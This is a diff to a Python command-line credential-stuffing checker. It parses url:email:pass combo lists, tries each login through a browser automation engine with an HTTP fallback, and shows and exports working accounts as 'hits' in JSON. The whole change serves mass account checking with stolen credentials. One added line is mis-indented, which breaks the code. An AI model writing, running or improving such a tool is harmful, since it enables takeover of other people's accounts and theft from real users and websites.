@@ -793,7 +793,7 @@ def main():
         
         choice = input(f"\n  {W}> {RES}").strip()
         
-        if choice == '1':
+                if choice == '1':
             # 1. NODE VALIDATION & SOURCE INTERROGATION
             if not combo_file or not os.path.exists(combo_file):
                 print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
@@ -804,77 +804,85 @@ def main():
                 for line in f:
                     line = line.strip()
                     if not line or line.startswith('#'): continue
-                    
-                    # Target Parser Logic: url:email:pass
                     parts = line.split(':')
                     if len(parts) >= 3:
-                        u_node = parts[0].strip()
-                        e_node = parts[1].strip()
-                        p_node = ':'.join(parts[2:]).strip()
-                        
-                        # Auto-Correction for Chrome Node Navigation
-                        if not u_node.startswith('http'):
-                            u_node = 'https://' + u_node
-                            
+                        u_node, e_node, p_node = parts[0].strip(), parts[1].strip(), ':'.join(parts[2:]).strip()
+                        if not u_node.startswith('http'): u_node = 'https://' + u_node
                         combos.append((u_node, e_node, p_node))
 
             if not combos:
                 print(f"  {R}No valid URL:EMAIL:PASS nodes detected.{RES}"); time.sleep(1); continue
 
             # 2. DYNAMIC SCREEN SCALING LOGIC
-            # Automatically calculates Termux width to prevent line-breaks
             import shutil
             cols, _ = shutil.get_terminal_size(fallback=(80, 24))
-            
-            # Proportional Column Width Calculation
-            w_st = 9  # Fixed width for Status
-            w_pa = int(cols * 0.15)
-            w_us = int(cols * 0.25)
-            w_li = cols - (w_st + w_pa + w_us + 12) # Remaining space for URL
+            w_st, w_pa, w_us = 9, int(cols * 0.15), int(cols * 0.25)
+            w_li = cols - (w_st + w_pa + w_us + 12)
 
             # 3. INITIALIZE EXTRACTION MESH
-            results = []; total = len(combos); done = 0; active = 0; lock = threading.Lock()
+            results = []; total = len(combos); active = 0; lock = threading.Lock()
             os.system('clear'); banner()
             
-            # --- AUTO-RESIZED SNIPPET HEADER ---
             print(f"  {Y}{'LINK':<{w_li}} {'|'} {'USER/EMAIL':<{w_us}} {'|'} {'PASS':<{w_pa}} {'|'} {'STATUS'}{RES}")
             print(f"  {DIM}{'─' * (cols - 4)}{RES}")
 
             def worker(url, email, pw):
-                nonlocal done, active
-                # Primary Execution: RealChrome CDP Engine
+                nonlocal active
                 r = chrome.login(url, email, pw)
-                
-                # Failover Execution: HTTP Signal Recovery
-                if not r['active'] and 'Err' in r.get('info', ''):
-                    r = http_login(url, email, pw)
+                if not r['active'] and 'Err' in r.get('info', ''): r = http_login(url, email, pw)
                 
                 with lock:
-                    results.append(r); done += 1
+                    results.append(r)
                     if r['active']: active += 1
-                    
-                    # Status Formatting
                     st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
-                    
-                    # Dynamic Row Truncation (Prevents UI ghosting/wrapping)
-                    l_txt = url[:w_li-3] + ".." if len(url) > w_li else url
-                    u_txt = email[:w_us-3] + ".." if len(email) > w_us else email
-                    p_txt = pw[:w_pa-3] + ".." if len(pw) > w_pa else pw
-                    
-                    # Output Row
-                    print(f"  {W}{l_txt:<{w_li}}{DIM} | {RES}{W}{u_txt:<{w_us}}{DIM} | {RES}{W}{p_txt:<{w_pa}}{DIM} | {RES}{st}")
+                    l_t = url[:w_li-3] + ".." if len(url) > w_li else url
+                    u_t = email[:w_us-3] + ".." if len(email) > w_us else email
+                    p_t = pw[:w_pa-3] + ".." if len(pw) > w_pa else pw
+                    print(f"  {W}{l_t:<{w_li}}{DIM} | {RES}{W}{u_t:<{w_us}}{DIM} | {RES}{W}{p_t:<{w_pa}}{DIM} | {RES}{st}")
 
-            # 4. EXECUTION DISPATCHER (ThreadPool Optimized for Termux)
+            # 4. EXECUTION DISPATCHER
             with ThreadPoolExecutor(max_workers=3) as ex:
-                for url, email, pw in combos: 
-                    ex.submit(worker, url, email, pw)
+                for url, email, pw in combos: ex.submit(worker, url, email, pw)
 
-            # 5. FINAL SESSION WRAP-UP
+            # 5. LIVE INTERACTIVE CONTROLS
             print(f"  {DIM}{'─' * (cols - 4)}{RES}")
             print(f"  {G}{active}/{total} active.{RES}")
             
+            while True:
+                print(f"\n  {W}[q]{RES} {DIM}View Active{RES}  {W}[w]{RES} {DIM}Export JSON{RES}  {W}[enter]{RES} {DIM}Return{RES}")
+                cmd = input(f"  {Y}Action: {RES}").lower()
+
+                if cmd == 'q':
+                    os.system('clear'); banner()
+                    print(f"  {Y}── ACTIVE SESSION NODES ──{RES}\n")
+                    active_list = [r for r in results if r['active']]
+                    if not active_list:
+                        print(f"  {R}No active accounts found in this session.{RES}")
+                    for hit in active_list:
+                        print(f"  {G}ACTIVE{RES} | {W}{hit['link']}{RES} | {DIM}{hit['email']}{RES}")
+                    
+                    input(f"\n  {W}[Press Enter to return to checking]{RES}")
+                    # RESTORE TABLE VIEW
+                    os.system('clear'); banner()
+                    print(f"  {Y}{'LINK':<{w_li}} {'|'} {'USER/EMAIL':<{w_us}} {'|'} {'PASS':<{w_pa}} {'|'} {'STATUS'}{RES}")
+                    print(f"  {DIM}{'─' * (cols - 4)}{RES}")
+                    for r in results:
+                        st = f"{G}ACTIVE{RES}" if r['active'] else f"{R}INVALID{RES}"
+                        l_t = r['link'][:w_li-3] + ".." if len(r['link']) > w_li else r['link']
+                        print(f"  {W}{l_t:<{w_li}}{DIM} | {RES}{W}{r['email'][:w_us-3]:<{w_us}}{DIM} | {RES}{W}{r['pass'][:w_pa-3]:<{w_pa}}{DIM} | {RES}{st}")
+
+                elif cmd == 'w':
+                    active_list = [r for r in results if r['active']]
+                    if active_list:
+                        out = f"hits_{int(time.time())}.json"
+                        with open(out, 'w') as f: json.dump(active_list, f, indent=4)
+                        print(f"  {G}[+]{RES} Exported to {out}")
+                    else: print(f"  {R}[!] No data to export.{RES}")
+
+                elif cmd == '':
+                    break 
+
             hits.extend([r for r in results if r['active']])
-            wait_enter()
             
         elif choice == '2':
             os.system('clear')
